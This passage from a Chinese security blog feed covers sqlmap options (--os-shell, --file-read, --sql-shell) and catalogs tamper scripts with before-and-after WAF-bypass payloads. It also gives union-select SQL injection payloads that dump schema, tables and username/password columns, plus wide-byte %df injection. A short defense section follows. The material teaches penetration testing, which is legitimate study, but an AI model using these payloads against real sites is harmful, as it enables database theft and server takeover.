<p>这个参数会影响测试的注入点，GET和POST的数据都会进行测试，<strong>HTTP cookie在level为2时就会测试</strong>，<strong>HTTP User-Agent&#x2F;Referer头在level为3时就会测试。</strong>总之，在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值。</p>
<h2 id="2-–is-dba：当前用户是否为管理权限"><a href="#2-–is-dba：当前用户是否为管理权限" class="headerlink" title="2.–is-dba：当前用户是否为管理权限"></a>2.–is-dba：当前用户是否为管理权限</h2><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示，在本案例中输入该命令，会返回Ture，如图3-15所示。</p>
<p><code>sqlmap.py –u ... --is-dba</code>&#x2F;&#x2F;最后两个不要分开写</p>
<p><img src="/../../../Typora/img111/image-20230620142942821.png"></p>
<h2 id="3-–roles：列出数据库管理员角色-oracle"><a href="#3-–roles：列出数据库管理员角色-oracle" class="headerlink" title="3.–roles：列出数据库管理员角色(oracle)"></a>3.–roles：列出数据库管理员角色(oracle)</h2><p>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。该命令仅适用于当前数据库是Oracle的时候。</p>
<h2 id="4-–referer-HTTP-Referer头"><a href="#4-–referer-HTTP-Referer头" class="headerlink" title="4.–referer:HTTP Referer头"></a>4.–referer:HTTP Referer头</h2><p>SQLMap可以在请求中伪造HTTP中的referer，当–level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如–referer <a href="http://www.baidu.com./">http://www.baidu.com。</a></p>
<h2 id="5-–sql-shell：运行自定义SQL语句"><a href="#5-–sql-shell：运行自定义SQL语句" class="headerlink" title="5.–sql-shell：运行自定义SQL语句"></a>5.–sql-shell：运行自定义SQL语句</h2><p>该命令用于执行指定的SQL语句，如下所示，假设执行select*from users limit 0,1语句，结果如图3-17所示。</p>
<p>sqlmap.py –u “<a href="http://192.168.1.7/sql/union.php?id=1%22--sql-shell">http://192.168.1.7/sql/union.php?id=1&quot;--sql-shell</a></p>
<p>然后在下一行填入即可。</p>
<h2 id="6-–os-cmd-–os-shell：运行任意操作系统命令"><a href="#6-–os-cmd-–os-shell：运行任意操作系统命令" class="headerlink" title="6.–os-cmd,–os-shell：运行任意操作系统命令"></a>6.–os-cmd,–os-shell：运行任意操作系统命令</h2><blockquote>
<p>在数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，<strong>如果数据库为MySQL、PostgreSQL,SQLMap上传一个二进制库，包含用户自定义的函数sys_exec（）和sys_eval（）</strong>，那么创建的这两个函数就可以执行系统命令。在Microsoft SQL Server中，SQLMap将使用xp_cmdshell存储过程，如果被禁用（在Microsoft SQL Server 2005及以上版本默认被禁制），则SQLMap会重新启用它；如果不存在，会自动创建。</p>
</blockquote>
<blockquote>
<p>用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时（比如PHP或ASP的后端数据库为MySQL），仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言（要想执行改参数，需要有数据库管理员权限，也就是–is-dba的值要为True）。</p>
</blockquote>
<h2 id="7-–file-read：从数据库服务器中读取文件"><a href="#7-–file-read：从数据库服务器中读取文件" class="headerlink" title="7.–file-read：从数据库服务器中读取文件"></a>7.–file-read：从数据库服务器中读取文件</h2><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p>
<h2 id="8-–file-write–file-dest：上传文件到数据库服务器中"><a href="#8-–file-write–file-dest：上传文件到数据库服务器中" class="headerlink" title="8.–file-write–file-dest：上传文件到数据库服务器中"></a>8.–file-write–file-dest：上传文件到数据库服务器中</h2><p>该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p>
<h1 id="三、tamper模块"><a href="#三、tamper模块" class="headerlink" title="三、tamper模块"></a>三、tamper模块</h1><p>官方提供53个绕过脚本</p>
<p><code>sqlmap.py XXXXX--tamper &quot;模块名&quot;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144015919.png" alt="tamper格式"></p>
<p>一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。</p>
<p>● priority定义脚本的优先级，用于有多个tamper脚本的情况。</p>
<p>● dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。</p>
<p>下面以一个转大写字符绕过的脚本为例，tamper绕过脚本主要由dependencies和tamper两个函数构成。def tamper（payload,kwargs）函数接收playload和kwargs返回一个Payload。下面这段代码的意思是通过正则匹配所有字符，将所有攻击载荷中的字符转换为大写字母。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620143709879.png"></p>
<p>对一些网站是否有安全防护（WAF&#x2F;IDS&#x2F;IPS）进行试探，可以使用参数**–identify-waf**进行检测</p>
<h2 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h2><p>常用的tamper脚本。</p>
<p>● apostrophemask.py</p>
<p>作用：将引号替换为UTF-8，用于过滤单引号。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND’1’&#x3D;’1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871</p>
<p>● base64encode.py</p>
<p>作用：替换为base64编码。</p>
<p>使用脚本前的语句为：</p>
<p>1’ AND SLEEP（5）#</p>
<p>使用脚本后，语句为：</p>
<p>MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</p>
<p>● multiplespaces.py</p>
<p>作用：围绕SQL关键字添加多个空格。</p>
<p>使用脚本前的语句为：</p>
<p>1 UNION SELECT foobar</p>
<p>使用脚本后，语句为：</p>
<p>1 UNION SELECT foobar</p>
<p>● space2plus.py</p>
<p>作用：用+号替换空格。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT+id+FROM+users</p>
<p>● nonrecursivereplacement.py</p>
<p>作用：作为双重查询语句，用双重语句替代预定义的SQL关键字（适用于非常弱的自定义过滤器，例如将SELECT替换为空）。</p>
<p>使用脚本前的语句为：</p>
<p>1 UNION SELECT 2-</p>
<p>使用脚本后，语句为：</p>
<p>1 UNIOUNIONN SELESELECTCT 2-</p>
<p>● space2randomblank.py</p>
<p>作用：将空格替换为其他有效字符。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%0Did%0DFROM%0Ausers</p>
<p>● unionalltounion.py</p>
<p>作用：将UNION ALL SELECT替换为UNION SELECT。</p>
<p>使用脚本前的语句为：</p>
<p>-1 UNION ALL SELECT</p>
<p>使用脚本后，语句为：</p>
<p>-1 UNION SELECT</p>
<p>● securesphere.py</p>
<p>作用：追加特制的字符串。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 1&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND 1&#x3D;1 and’0having’&#x3D;’0having’</p>
<p>● space2hash.py</p>
<p>作用：将空格替换为#号，并添加一个随机字符串和换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227&#x3D;9227</p>
<p>● space2mssqlblank.py（mssql）</p>
<p>作用：将空格替换为其他空符号。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%0Eid%0DFROM%07users</p>
<p>● space2mssqlhash.py</p>
<p>作用：将空格替换为#号，并添加一个换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1%23%0AAND%23%0A9227&#x3D;9227</p>
<p>● between.py</p>
<p>作用：用NOT BETWEEN 0 AND替换大于号（&gt;），用BETWEEN AND替换等号（&#x3D;）。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND A &gt; B-</p>
<p>使用脚本后，语句为：</p>
<p>1 AND A NOT BETWEEN 0 AND B-</p>
<p>使用脚本前的语句为：</p>
<p>1 AND A&#x3D;B-</p>
<p>使用脚本后，语句为：</p>
<p>1 AND A BETWEEN B AND B-</p>
<p>● percentage.py</p>
<p>作用：ASP允许在每个字符前面添加一个%号。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD FROM TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%S%E%L%E%C%T%F%I%E%L%D%F%R%O%M%T%A% B%L%E</p>
<p>● sp_password.py</p>
<p>作用：从DBMS日志的自动模糊处理的有效载荷中追加sp_password。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227-</p>
<p>使用脚本后，语句为：</p>
<p>1 AND 9227&#x3D;9227–sp_password</p>
<p>● charencode.py</p>
<p>作用：对给定的Payload全部字符使用URL编码（不处理已经编码的字符）。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD FROM%20TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</p>
<p>● randomcase.py</p>
<p>作用：随机大小写。</p>
<p>使用脚本前的语句为：</p>
<p>INSERT</p>
<p>使用脚本后，语句为：</p>
<p>InsERt</p>
<p>● charunicodeencode.py</p>
<p>作用：字符串unicode编码。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD%20FROM TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020 %u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045</p>
<p>● space2comment.py</p>
<p>作用：将空格替换为&#x2F;**&#x2F;。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT&#x2F;<strong>&#x2F;id&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</p>
<p>● equaltolike.py</p>
<p>作用：将等号替换为like。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT * FROM users WHERE id&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>SELECT * FROM users WHERE id LIKE 1</p>
<p>● greatest.py</p>
<p>作用：绕过对“&gt;”的过滤，用GREATEST替换大于号。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND A &gt; B</p>
<p>使用脚本后，语句为：</p>
<p>1 AND GREATEST（A,B+1）&#x3D;A</p>
<p>测试通过的数据库类型和版本：</p>
<p>● MySQL 4、MySQL 5.0和MySQL 5.5</p>
<p>● Oracle 10g</p>
<p>● PostgreSQL 8.3、PostgreSQL 8.4和PostgreSQL 9.0</p>
<p>● ifnull2ifisnull.py</p>
<p>作用：绕过对IFNULL的过滤，替换类似IFNULL（A,B）为IF（ISNULL（A）,B,A）。</p>
<p>使用脚本前的语句为：</p>
<p>IFNULL（1,2）</p>
<p>使用脚本后，语句为：</p>
<p>IF（ISNULL（1）,2,1）</p>
<p>测试通过的数据库类型和版本为MySQL 5.0和MySQL 5.5。</p>
<p>● modsecurityversioned.py</p>
<p>作用：过滤空格，使用MySQL内联注释的方式进行注入。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 2&gt;1-</p>
<p>使用脚本后，语句为：</p>
<p>1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;-</p>
<p>测试通过的数据库类型和版本为MySQL 5.0。</p>
<p>● space2mysqlblank.py</p>
<p>作用：将空格替换为其他空白符号（适用于MySQL）。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%A0id%0BFROM%0Cusers</p>
<p>测试通过的数据库类型和版本为MySQL 5.1。</p>
<p>● modsecurityzeroversioned.py</p>
<p>作用：使用MySQL内联注释的方式（&#x2F;<em>!00000</em>&#x2F;）进行注入。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 2&gt;1-</p>
<p>使用脚本后，语句为：</p>
<p>1 &#x2F;<em>!00000AND 2&gt;1</em>&#x2F;-</p>
<p>测试通过的数据库类型和版本为MySQL 5.0。</p>
<p>● space2mysqldash.py</p>
<p>作用：将空格替换为–，并添加一个换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1–%0AAND–%0A9227&#x3D;9227</p>
<p>● bluecoat.py</p>
<p>作用：在SQL语句之后用有效的随机空白符替换空格符，随后用LIKE替换等于号。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users where id&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%09id FROM%09users WHERE%09id LIKE 1</p>
<p>测试通过的数据库类型和版本为MySQL 5.1和SGOS。</p>
<p>● versionedkeywords.py</p>
<p>作用：注释绕过。</p>
<p>使用脚本前的语句为：</p>
<p>UNION ALL SELECT NULL,NULL,CONCAT（CHAR（58,104,116,116,58）,IFNULL（CAST（CURRENT_USER（）AS CHAR）,CHAR（32））,CH&#x2F;**&#x2F;AR（58,100,114,117,58））#</p>
<p>使用脚本后，语句为：</p>
<p>&#x2F;<em>!UNION**!ALL**!SELECT</em><em>!NULL</em>&#x2F;,&#x2F;<em>!NULL</em>&#x2F;,CONCAT（CHAR（58,104,116,116,58）,IFNULL（CAST（CURRENT_USER（）&#x2F;<em>!AS</em><em>!CHAR</em>&#x2F;）,CHAR（32））,CHAR（58,100,114,117,58））#</p>
<p>● halfversionedmorekeywords.py</p>
<p>作用：当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释。</p>
<p>使用脚本前的语句为：</p>
<p>value’ UNION ALL SELECT CONCAT（CHAR（58,107,112,113,58）,IFNULL（CAST （CURRENT_USER（）AS CHAR）,CHAR（32））,CHAR（58,97,110,121,58））,NULL,NULL# AND ‘QDWa’&#x3D;’QDWa</p>
<p>使用脚本后，语句为：</p>
<p>value’&#x2F;<em>!0UNION&#x2F;</em>!0ALL&#x2F;<em>!0SELECT&#x2F;</em>!0CONCAT（&#x2F;<em>!0CHAR（58,107,112,113,58）,&#x2F;</em>!0IFN ULL（CAST（&#x2F;<em>!0CURRENT_USER（）&#x2F;</em>!0AS&#x2F;<em>!0CHAR）,&#x2F;</em>!0CHAR（32））,&#x2F;<em>!0CHAR（58,97,110,121,5 8））,&#x2F;</em>!0NULL,&#x2F;<em>!0NULL#&#x2F;</em>!0AND’QDWa’&#x3D;’QDWa</p>
<p>测试通过的数据库类型和版本为MySQL 4.0.18和MySQL 5.0.22。</p>
<p>● space2morehash.py</p>
<p>作用：将空格替换为#号，并添加一个随机字符串和换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23 lujYFWfv%0A9227&#x3D;9227</p>
<p>测试通过的数据库类型和版本为MySQL 5.1.41。</p>
<p>● apostrophenullencode.py</p>
<p>作用：用非法双字节unicode字符替换单引号。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND’1’&#x3D;’1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND %00%271%00%27&#x3D;%00%271</p>
<p>● appendnullbyte.py</p>
<p>作用：在有效负荷的结束位置加载零字节字符编码。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 1&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND 1&#x3D;1%00</p>
<p>● chardoubleencode.py</p>
<p>作用：对给定的Payload全部字符使用双重URL编码（不处理已经编码的字符）。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD FROM%20TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%25 4f%254d%2520%2554%2541%2542%254c%2545</p>
<p>● unmagicquotes.py</p>
<p>作用：用一个多字节组合（%bf%27）和末尾通用注释一起替换空格。</p>
<p>使用脚本前的语句为：</p>
<p>1’ AND 1&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>1%bf%27-</p>
<p>● randomcomments.py</p>
<p>作用：用&#x2F;**&#x2F;分割SQL关键字。</p>
<p>使用脚本前的语句为：</p>
<p>INSERT</p>
<p>使用脚本后，语句为：</p>
<p>IN&#x2F;**&#x2F;S&#x2F;**&#x2F;ERT</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以平时要根据tamper规则自定义写，以面对复杂情况</p>
]]></content>
      <categories>
        <category>sqlmap使用</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>sqlmap使用</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入-tips</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>

<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
<p><strong>;%00</strong>代替–+进行注释</p>
<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
<p>没括号则是id&#x3D;2页面</p>
<p><img src="/../../../Typora/img111/image-20230523131633798.png" alt="image-20230523131633798"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
</blockquote>
<blockquote>
<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
</blockquote>
<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
<p><strong>mysql_real_escape_string() 函数</strong></p>
<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
<ul>
<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
</ul>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<blockquote>
<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p><code>limit m,n</code></p>
<p>其中，m是偏移量，n是要查询的数量。</p>
<blockquote>
<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
</blockquote>
<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
</li>
<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
</li>
<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
</li>
<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
</li>
</ol>
<p>危险参数过滤：</p>
<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>Mysql爆破语句</tag>
        <tag>注入绕过</tag>
        <tag>sql注入技巧</tag>
        <tag>sql注入防御</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入之联合注入</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
<p>1、    判断注入点</p>
<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
<p>2、    判断<strong>闭合</strong>形式</p>
<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
<p>3、判断查询列数</p>
<p>1’ order by 1–+</p>
<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
<p>4、判断显示位</p>
<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
<p>常用语句为-1’ union select 1,2,3–+</p>
<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
<p>5、获取所有数据库名</p>
<p>6、获取数据库所有表名</p>
<p>7、获取字段名 </p>
<p>8、获取字段中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
]]></content>
      <categories>
